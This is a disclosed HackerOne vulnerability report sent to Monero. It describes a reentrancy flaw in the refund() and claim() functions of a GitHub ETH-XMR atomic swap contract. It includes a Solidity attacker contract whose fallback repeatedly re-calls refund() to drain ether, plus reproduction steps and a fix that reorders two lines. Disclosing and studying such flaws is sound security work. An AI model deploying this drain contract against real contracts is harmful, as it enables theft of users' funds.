# Reentrancy attack in eth-monero atomic swap

## Report Details
- **Report ID**: 1668258
- **URL**: https://hackerone.com/reports/1668258
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2022-08-13T07:59:34.310Z
- **Disclosed**: 2023-04-20T06:38:16.705Z

## Reporter
- **Username**: farinavito123
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: monero

## Vulnerability Information
## Summary:
I have found a reentrancy vulnerability  in the eth-xmr atomic swap's smart contract that has been built by noot and has been founded by Monero CSS proposal. This will allow the attacker to drain almost all of the ethers from the smart contract. Due to technical reasons, there will remain only 1 ether in the smart contract.

However, this is the code published in the github of noot. I haven't found any smart contract that has implemented this code. Therefore, I have tagged it with low severity. I am not an active member of monero community, therefore, I don't really know if this feature is actually used and how much. 
I have found smart contract that could be used for atomic swap between eth-xmr, but it hasn't got this vulnerability. For the address of this smart contract, please check section ##How I have found about this


## Steps To Reproduce:
The attack occurs in the SwapFactory.sol smart contract
  1. Deploy the smart contract bellow that will act as the attacker. When deploying, you have to initialize 5 variables in the constructor.
     * _swapFactoryAddress => the address of the deployed smart contract that we are attacking
    *  pubKeyRefund_ => enter the public key you have from the eliptic curve
    *  claimer_  => it is already initialize to the attacker's smart contract address
    *  timeoutDuration_ => how much time it must pass before we can refund
    *  nonce_ => a unique identifier

contract Attack {
    SwapFactory public factory;

     bytes32 public pubKeyRefund;
     address public payable claimer;
     uint256 public timeoutDuration;
     uint256 public nonce;

     //storing the refund's parameters
     tuple refundsSwap;
     bytes32 refundssecret;

    constructor(
              address _swapFactoryAddress, 
              bytes32 pubKeyRefund_,
              uint256 timeoutDuration_,
              uint256 nonce_
              ) {
        factory = SwapFactory(_swapFactoryAddress);
        pubKeyRefund  = pubKeyRefund_;
        claimer = address(this);
        timeoutDuration = timeoutDuration_;
        nonce = nonce_;
    }

    //Create a new swap
    function createSwap() public payable {
         factory.new_swap(pubKeyRefund, claimer, timeoutDuration, nonce)
    }

     //Create a new swap
    function initializeReady(tuple _swap) public {
         factory.set_ready(_swap)
    }

    //Initialize the variables that will be used as parameters for the refund
    function initializeRefundsParameters(tuple _refundsSwap, bytes32 _refundsSecret) public {
        refundsSwap = _refundsSwap;
        refundsSecret = _refundsSecret;
    }

    // Fallback is called when SwapFactory sends Ether to this contract.
    fallback() external payable {
       if (address(factory).balance >= 1 ether) {
          factory.refund(refundsSwap, refundsSecret);
       }
    }

    function attack() external payable {
        factory.refund(refundsSwap, refundsSecret);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

2. Call the createSwap(). This will call  the SwapFactory's new_swap() with the parameters we have initialized when deploying the Attack smart contract
3. Call the initializeReady(). This will call  the SwapFactory's set_ready(). You have to put in correct address.
4. Call initializeRefundsParameters(). This will initialize 2 variables that we are going to use when calling SwapFactory's refund(). Make sure you pass 2 correct parameters. You do this before deploying the Attack smart contract.
5. Call the attack() 
6. This will call the SwapFactory's refund()
7. refund() has 3 requirement statements that we need to pass:
    *  require(swapStage != Stage.COMPLETED && swapStage != Stage.INVALID, "swap is already completed");
     It will pass, because we have called the set_ready(), which will set the swap to READY
    *require(msg.sender == _swap.owner, "refund must be called by the swap owner");
    It will pass, because we have iitialized the smart contract as the swap's owner
    *require(
            block.timestamp >= _swap.timeout_1 ||
            (block.timestamp < _swap.timeout_0 && swapStage != Stage.READY),
            "it's the counterparty's turn, unable to refund, try again later"
        );
    It will pass, if we call refund(), after swap.timeout_0. We have setted the swap to READY, therefore, the second part of the || will succeeed
8. The refund() will then verify the keys, therefore, it's essential that we have initialize the variables, which are used in refund() as parameters, correctly
9. The refund() will then emit an event
10. Now we come to the vulnerability. The smart contract will send us the ether in the swap. This will call our fallback() in the Attack smart contract. The fallback() will again call the refund() with the same parameters. Because the SwapFactory.sol changes the swap stage into COMPLETED only after sending ether, we can drain everything except 1 ether from the smart contract. The cycle:
- refund() sends eth to our smart contract
- this initializes fallback() in the smart contract,
- it checks if there is more than 1 eth in the SwapFactory. If it is, it calls again the refund()
- because we still fulfill all the requirements in the refund(), the refund() will send us eth again
-  it checks if there is more than 1 eth in the SwapFactory. If it is, it calls again the refund()
- ....
- when there is only 1 eth left in the SwapFactory smart contract, the transaction will end


The same vulnerability can be found in the claim() of the SwapFactory. However, you would need to create 2 addresses and 2 public and private keys. One address would work as the creator of the swap and the other would collect swap. However, when collecting, you would be able to drain the eth from the smart contract.

##Easy fix
We can easily fix this vulnerability, by swapping the last two lines of code in the refund() and claim()
The code in refund() would look like this:

swaps[swapID] = Stage.COMPLETED;
_swap.owner.transfer(_swap.value);

The code in claim would look like this:

swaps[swapID] = Stage.COMPLETED;
_swap.claimer.transfer(_swap.value);

##Why is this a low risk
Because, I haven't found any smart contract that would implement this code. However, as I have said before, I am not an active member of monero community. If there is a smart contract such as this, this would be a CRITICAL bug. Please verify that there isn't a deployed smart contract with this vulnerability.

##Why have I messaged you and not the creator of atomic swap (so-called noot, as it goes by the name on the github)
Because, you have founded the creator by Monero CSS proposal. Check: https://ccs.getmonero.org/proposals/noot-eth-xmr-atomic-swap.html

##What I would like from you
1. Check if my vulnerability assumption is correct
2. Verify if there is a such smart contract deployed in the wild
3. Contact the user "noot", on the github and please make sure that the code in the noot's repository is fixed. Please, do this also in the case that there isn't a smart contract with this vulnerability deployed in the wild. You may think this is irrelevant, but I can assure you this is not. Developers look and copy&paste other developer's work. I am afraid there could be or already exists a scenario, where a developer copy&paste the code into his/her project. This would open a vulnerability in their system.  
4. If you think my discovery deserves bug bounty, please let me know. Currently, I haven't got a monero address

##How I have found about this
I have stumbled upon this tweet ( https://twitter.com/officer_cia/status/1558143855509250048 ) that has led me to another tweet ( https://twitter.com/monero/status/1465370782524231690?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1465370782524231690%7Ctwgr%5E8036b8f2e58dffde3bc220ad14014ab7ef6b741e%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fen.cryptonomist.ch%2F2021%2F12%2F02%2Ffirst-swap-between-xmr-and-eth%2F), subsequently, I have started to look the smart contract's code in  https://github.com/noot/atomic-swap

When some research, I have found the following reddit topic: https://www.reddit.com/r/Monero/comments/r4orvf/first_atomic_swap_ethereum_transaction_seen_in/
which has led me to arbiscan (https://arbiscan.io/tx/0x1f88eae85f110dca8c3a0f45f57c783fb60c19a3ce90640e00207f0f024e3f74 ). 

When looking at the deployed smart contract ( https://arbiscan.io/address/0x130d763efb58295bf8e645a014a6952ba687bf25#code ), I have realized that the smart contract was changed in comparison  to the "noot's" github account. The vulnerability was fixed.


## Supporting Material/References:
Initial tweet:                                                                              https://twitter.com/officer_cia/status/1558143855509250048
Monero's tweet:                                                                     https://twitter.com/monero/status/1465370782524231690?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1465370782524231690%7Ctwgr%5E8036b8f2e58dffde3bc220ad14014ab7ef6b741e%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fen.cryptonomist.ch%2F2021%2F12%2F02%2Ffirst-swap-between-xmr-and-eth%2F
Reddit's post:                                                                         https://www.reddit.com/r/Monero/comments/r4orvf/first_atomic_swap_ethereum_transaction_seen_in/
Arbiscan transaction link: https://arbiscan.io/tx/0x1f88eae85f110dca8c3a0f45f57c783fb60c19a3ce90640e00207f0f024e3f74
Smart contract source code on arbiscan:          https://arbiscan.io/address/0x130d763efb58295bf8e645a014a6952ba687bf25#code
example of reentrancy attack                                    https://hackernoon.com/hack-solidity-reentrancy-attack
noot's github account                                                      https://github.com/noot/atomic-swap
Monero CSS proposal for the atomic swap      https://ccs.getmonero.org/proposals/noot-eth-xmr-atomic-swap.html


## Housekeeping

1. I have read your disclosure policy
2.Currently, I haven't got a monero address
3. My twitter account: https://twitter.com/farinavito1

## Impact

I have found a reentrancy vulnerability  in the eth-xmr atomic swap's smart contract that has been built by noot and has been founded by Monero CSS proposal. This will allow the attacker to drain almost all of the ethers from the smart contract. Due to technical reasons, there will remain only 1 ether in the smart contract.

However, this is the code published in the github of noot. I haven't found any smart contract that has implemented this code. Therefore, I have tagged it with low severity. I am not an active member of monero community, therefore, I don't really know if this feature is actually used and how much. 
I have found smart contract that could be used for atomic swap between eth-xmr, but it hasn't got this vulnerability. For the address of this smart contract, please check section ##How I have found about this

## Attachments
No attachments
